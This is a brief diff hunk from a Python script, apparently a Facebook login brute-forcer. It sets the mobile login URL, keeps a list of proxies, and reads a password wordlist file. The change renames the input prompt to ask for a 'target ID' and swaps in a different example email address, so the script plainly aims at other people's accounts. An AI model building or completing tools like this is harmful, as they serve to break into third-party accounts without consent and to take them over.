@@ -82,8 +82,8 @@ proxies_list = [
 ]
 URL = 'https://m.facebook.com/login'
 sleep(2)
-print ('Example : kadal15@yahoo.co.id')
-email = input('Masukkan Email Anda : ')
+print ('Example : jonathandresign@gmail.com')
+email = input('Masukkan ID target: ')
 sleep(1)
 sandi = input('Masukkan Password.txt : ')
 passw = open(sandi, 'r')
